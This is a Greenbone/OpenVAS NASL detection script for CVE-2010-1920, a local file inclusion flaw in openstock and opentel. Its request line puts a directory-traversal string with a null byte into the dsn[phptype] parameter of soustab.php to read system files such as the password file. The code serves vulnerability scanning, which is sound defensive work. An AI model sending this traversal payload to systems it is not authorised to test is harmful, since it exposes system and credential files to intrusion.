# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100578");
  script_version("2022-02-18T14:06:48+0000");
  script_tag(name:"last_modification", value:"2022-02-18 14:06:48 +0000 (Fri, 18 Feb 2022)");
  script_tag(name:"creation_date", value:"2010-04-15 19:15:10 +0200 (Thu, 15 Apr 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-1920");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("openstock/opentel <= 1.02 / <= 2.02 LFI Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"openstock/opentel is prone to a local file include (LFI)
  vulnerability because it fails to properly sanitize user supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain
  potentially sensitive information and execute arbitrary local scripts in the context of the
  webserver process. This may allow the attacker to compromise the application and the underlying
  computer, other attacks are also possible.");

  script_tag(name:"affected", value:"openstock facture version 2.02 and opentel openmairie tel
  version 1.02 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/23505");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39484");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39486");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("os_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/openstock", "/openmairie_stock", "/openmairie_Tel", "/opentel", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/scr/soustab.php" );
  if( res !~ "^HTTP/1\.[01] 200" )
    continue;

  foreach file (keys(files)) {

    url = dir + "/scr/soustab.php?dsn[phptype]=../../../../../../../../../../../" + files[file] + "%00";

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
